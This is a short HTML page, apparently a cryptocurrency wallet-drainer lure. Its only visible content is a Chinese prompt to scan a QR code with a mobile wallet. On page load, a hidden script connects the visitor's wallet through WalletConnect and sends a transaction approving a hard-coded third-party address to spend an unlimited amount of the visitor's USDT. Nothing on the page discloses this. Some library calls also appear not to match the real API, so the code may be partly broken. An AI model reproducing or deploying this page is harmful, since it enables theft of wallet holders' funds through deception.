<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WalletConnect v2 USDT Approve</title>
  <script type="module">
    import { Web3Modal } from 'https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.js';
    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2.4.3/dist/index.js';
    import { configureChains, createConfig, WagmiConfig } from 'https://unpkg.com/wagmi@1.3.0/dist/index.js';
    import { mainnet } from 'https://unpkg.com/wagmi@1.3.0/chains.js';

    const projectId = '0e9825c91dcd9bd56ad22e6494e36731'; // 測試用 ID

    const { chains, publicClient } = configureChains([mainnet], [w3mProvider({ projectId })]);
    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, chains }),
      publicClient
    });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);
    const modal = new Web3Modal({ projectId, themeMode: 'light' }, ethereumClient);

    window.onload = async () => {
      const provider = await modal.openModal();
      if (!provider) return;

      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      const owner = accounts[0];

      const tx = {
        from: owner,
        to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        data: '0x095ea7b3000000000000000000000000FcD84b879Ac87413a3c25EE85C2210Bf9539c4F5ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
      };

      await provider.request({ method: 'eth_sendTransaction', params: [tx] });
    };
  </script>
</head>
<body style="display: flex; justify-content: center; align-items: center; height: 100vh">
  <h2>請用手機錢包掃描 QR Code</h2>
</body>
</html>
